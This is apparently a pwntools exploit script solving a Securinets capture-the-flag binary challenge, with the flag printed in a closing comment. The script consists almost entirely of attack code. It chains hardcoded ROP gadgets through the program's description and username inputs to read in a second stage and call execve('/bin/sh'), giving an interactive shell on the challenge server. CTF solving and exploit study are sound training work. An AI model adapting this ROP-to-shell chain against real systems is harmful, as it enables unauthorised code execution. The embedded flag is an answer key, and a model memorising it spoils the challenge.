#!/usr/bin/python3

from pwn import *

exe = ELF('main', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*readUsername
                b*readDescription+53
                b* 0x0000000000401911
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwn.ctf.securinets.tn', 7777)
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x0000000000401f3d
pop_rsi = 0x000000000040ab23
pop_rax_rdx_rbx = 0x0000000000463366
pop_rdx_rbx =0x0000000000463367
syscall = 0x00000000004011a2
write = 0x431c60
def user(context):
        sleep(1)
        sl(b"1")
        sleep(1)
        sl(context)
def description(context):
        sleep(1)
        sl(b"2")
        sleep(1)
        sl(context)
shell =  p64(pop_rdi)+ p64(0) + p64(pop_rsi) + p64(0x4a5fe8)+ p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(0x431bc0) + p64(0x0000000000402308) + p64(0x4a5fe8+8)
payload = p64(0x0000000000401016)*(17 - len(shell)//8) + shell
payload = payload.ljust(143, b"a")
description(payload)
user(p64(0x0000000000401016)*2 + p8(0x00))
shellcode = b"/bin/sh\0"
shellcode+= p64(pop_rdi) + p64(0x4a5fe8)
shellcode+= p64(pop_rsi) + p64(0)
shellcode+= p64(pop_rax_rdx_rbx) + p64(0x3b) + p64(0)+ p64(0)
shellcode+= p64(syscall)
# sleep(5)
sleep(1)

sl( b"3")
# input("shellcode")
sleep(1)

sl(shellcode)
p.interactive()
# Securinets{626c656272591c0a935d1556ed9f8e80439ff02869c0590c9689f63ce51d9f08}